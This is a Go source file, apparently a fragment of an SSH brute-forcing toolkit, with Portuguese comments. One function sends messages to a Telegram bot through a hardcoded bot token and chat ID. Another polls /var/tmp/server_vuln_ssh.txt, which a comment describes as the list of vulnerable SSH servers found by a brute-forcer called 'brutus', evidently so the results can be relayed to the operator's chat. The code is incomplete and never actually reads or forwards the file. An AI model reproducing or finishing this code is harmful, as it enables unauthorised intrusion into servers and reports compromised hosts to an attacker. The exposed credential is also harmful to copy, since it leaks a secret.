package main

import (
	"bytes"
	"encoding/json"
	"net/http"
        "fmt"
       "time"
      "os"
      


)



var token string = "8788643517:AAH8qGbylRhwyXLRwQW6pXx8ufFExli6TuE"



func bot(msg string ) {






      time.Sleep  ( 30     *  time.Second)  //evite    too many requests 



	cli := http.Client{}


       



	str := map[string]string{

		"chat_id": "7127446120",

		"text":    msg  , 


	}




	jm, _ := json.Marshal(str)

	data := bytes.NewBufferString(string(jm))

	req, _ := http.NewRequest("POST", "https://api.telegram.org/bot"+token+"/sendMessage", data)

	req.Header.Set("Content-Type", "application/json")

	r, _ := cli.Do(req)

       

  
       if  r.StatusCode  ==    200 { fmt.Println( " send ok"  ) }




}








     //essa funcao vai verifica em um lopp infinito  o arquivo  server_vuln_ssh.txt  que sera gerado pelo  brutus em  caso
     //dele  te sucesso na busca de alvos 





func  verify_ips_ssh_by_brutus(){



filename := "server_vuln_ssh.txt"


for {

ptr ,  err_op := os.Open("/var/tmp/" +  filename )

 if err_op != nil { continue }

 fmt.Println(ptr)



}


}

















